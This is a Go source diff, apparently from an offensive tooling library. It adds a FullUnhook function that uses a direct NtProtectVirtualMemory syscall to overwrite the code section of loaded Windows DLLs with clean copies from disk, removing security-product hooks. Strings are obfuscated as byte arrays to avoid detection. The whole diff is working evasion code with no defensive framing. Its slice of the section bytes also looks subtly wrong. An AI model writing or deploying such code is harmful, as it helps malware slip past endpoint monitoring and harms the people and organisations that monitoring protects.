@@ -6,8 +6,10 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"golang.org/x/sys/windows/registry"
 	"io/ioutil"
 	"os"
+	"strconv"
 	"strings"
 	"syscall"
 	"unicode/utf16"
@@ -431,12 +433,97 @@ func HgSyscall(callid uint16, argh ...uintptr) (errcode uint32, err error) {
 	return errcode, err
 }
 
+func FullUnhook(DLLname []string) error {
+
+	//get customsyscall
+	//todo: change registry ops into syscall
+	var customsyscall uint16
+	regkey, _ := registry.OpenKey(registry.LOCAL_MACHINE, string([]byte{'S', 'O', 'F', 'T', 'W', 'A', 'R', 'E', '\\', 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', '\\', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}), registry.QUERY_VALUE)
+	CurrentVersion, _, _ := regkey.GetStringValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'V', 'e', 'r', 's', 'i', 'o', 'n'}))
+	MajorVersion, _, err := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'a', 'j', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
+	if err == nil {
+		MinorVersion, _, _ := regkey.GetIntegerValue(string([]byte{'C', 'u', 'r', 'r', 'e', 'n', 't', 'M', 'i', 'n', 'o', 'r', 'V', 'e', 'r', 's', 'i', 'o', 'n', 'N', 'u', 'm', 'b', 'e', 'r'}))
+		CurrentVersion = strconv.FormatUint(MajorVersion, 10) + "." + strconv.FormatUint(MinorVersion, 10)
+	}
+	regkey.Close()
+
+	if CurrentVersion == "10.0" {
+		customsyscall = 0x50
+	} else {
+		return nil
+	}
+
+	for _, d := range DLLname {
+		dll, err := ioutil.ReadFile(d)
+		if err != nil {
+			return err
+		}
+		file, error1 := pe.Open(d)
+		if error1 != nil {
+			return error1
+		}
+		x := file.Section(string([]byte{'.', 't', 'e', 'x', 't'}))
+		bytes := dll[x.Offset:x.Size]
+		loaddll, error2 := windows.LoadDLL(d)
+		if error2 != nil {
+			return error2
+		}
+		handle := loaddll.Handle
+		dllBase := uintptr(handle)
+		dllOffset := uint(dllBase) + uint(x.VirtualAddress)
+		var oldfartcodeperms uintptr
+		regionsize := uintptr(len(bytes))
+		handlez := uintptr(0xffffffffffffffff)
+		runfunc, _ := NPVM(
+			customsyscall,
+			handlez,
+			(*uintptr)(unsafe.Pointer(&dllOffset)),
+			&regionsize,
+			syscall.PAGE_EXECUTE_READWRITE,
+			&oldfartcodeperms,
+		)
+		if runfunc != 0 {
+		}
+
+		for i := 0; i < len(bytes); i++ {
+			loc := uintptr(dllOffset + uint(i))
+			mem := (*[1]byte)(unsafe.Pointer(loc))
+			(*mem)[0] = bytes[i]
+		}
+
+		runfunc, _ = NPVM(
+			customsyscall,
+			handlez,
+			(*uintptr)(unsafe.Pointer(&dllOffset)),
+			&regionsize,
+			oldfartcodeperms,
+			&oldfartcodeperms,
+		)
+		if runfunc != 0 {
+		}
+	}
+	return nil
+}
+
+func NPVM(sysid uint16, processHandle uintptr, baseAddress, regionSize *uintptr, NewProtect uintptr, oldprotect *uintptr) (uint32, error) {
+	return NtP(
+		sysid,
+		processHandle,
+		uintptr(unsafe.Pointer(baseAddress)),
+		uintptr(unsafe.Pointer(regionSize)),
+		NewProtect,
+		uintptr(unsafe.Pointer(oldprotect)),
+	)
+}
+
 func str2sha1(s string) string {
 	h := sha1.New()
 	h.Write([]byte(s))
 	bs := h.Sum(nil)
 	return fmt.Sprintf("%x", bs)
 }
+
+func NtP(callid uint16, argh ...uintptr) (errcode uint32, err error)
 
 //Syscall calls the system function specified by callid with n arguments. Works much the same as syscall.Syscall - return value is the call error code and optional error text. All args are uintptrs to make it easy.
 func hgSyscall(callid uint16, argh ...uintptr) (errcode uint32)
